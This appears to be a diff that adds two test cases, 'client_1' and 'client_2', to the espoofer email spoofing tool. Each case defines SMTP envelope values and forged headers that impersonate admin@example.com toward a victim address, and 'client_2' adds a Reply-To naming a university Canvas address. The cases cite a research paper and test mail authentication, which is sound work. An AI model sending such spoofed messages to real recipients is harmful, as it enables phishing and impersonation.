@@ -322,4 +322,36 @@ test_cases = {
         },
         "description": b"Spoofing via an email service account, refer to section 6.2 in the paper."
     },
+    "client_1":{
+        "helo": b"espoofer-MacBook-Pro.local",
+        "mailfrom": b"<attacker@example.com>",
+        "rcptto": b"<victim@victim.com>",
+        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <first@legitimate.com>, <second@attack.com>"},
+        "data": {
+            "from_header": b"From: <admin@example.com>\r\n",
+            "to_header": b"To: <victim@victim.com>\r\n",
+            "subject_header": b"Subject: client A3: Spoofing via an email service account\r\n",
+            "body": b"Hi, this is a test message! Best wishes.\r\n",
+            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
+        },
+        "description": b"Spoofing via an email service account, refer to section 6.2 in the paper."
+
+    },
+    "client_2":{
+        "helo": b"espoofer-MacBook-Pro.local",
+        "mailfrom": b"<attacker@example.com>",
+        "rcptto": b"<victim@victim.com>",
+        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <first@legitimate.com>, <second@attack.com>"},
+        
+        
+        "data": {
+            "from_header": b"From: <admin@example.com>\r\n",
+            "to_header": b"To: <victim@victim.com>\r\n",
+            "subject_header": b"Subject: client A3: Spoofing via an email service account\r\n",
+            "body": b"Hi, this is a test message! Best wishes.\r\n",
+            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: multipart/alternative;\r\n boundary="--==_this_is_the_separate_line";\r\n charset="UTF-8"\r\nReply-To: canvas+1145141919810~nice@sjtu.edu.cn\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nContent-Transfer-Encoding: 7bit\r\nAuto-Submitted: auto-generated\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
+        },
+        "description": b"Spoofing via an email service account, refer to section 6.2 in the paper."
+
+    }
 }
